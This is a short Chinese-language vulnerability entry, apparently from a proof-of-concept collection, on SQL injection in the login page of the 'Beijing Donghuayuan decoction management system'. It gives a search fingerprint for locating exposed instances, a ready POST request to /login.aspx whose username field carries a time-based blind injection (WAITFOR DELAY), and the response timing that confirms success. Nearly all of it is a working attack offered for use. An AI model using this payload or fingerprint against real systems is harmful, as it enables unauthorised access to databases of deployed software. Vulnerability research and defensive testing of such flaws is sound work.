# 北京东华原煎药管理系统前台login存在SQL注入漏洞

北京东华原煎药管理系统前台 ｜ SQL注入 ｜ —
- **指纹**：`body="北京东华原煎药管理系统"`
- **请求**：`POST /login.aspx HTTP/1.1`

**Payload**
```
__VIEWSTATE=%2FwEPDwUKLTUwOTQ0NDQ3MWRkpgdsi8t2Mpk2etkPTx4dYYLWqCgu%2FxH2%2BSt7PujLq64%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAARwJ6xNw95zeL4t2WXovB5lY3plgk0YBAefRz3MyBlTcE5Fo5u8Nmrtdka2GVrCes2inihG6d%2FXh3PZm3b5AoMQd2u8tes2WA%2BdOem8kT6x%2BfxKMf1BxSTB7qkCSortUm0%3D&txtUserName=admin%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--&txtUserPwd=123&btnLogin=%E7%99%BB%E5%BD%95
```
- **响应特征**：200 响应时间>=3s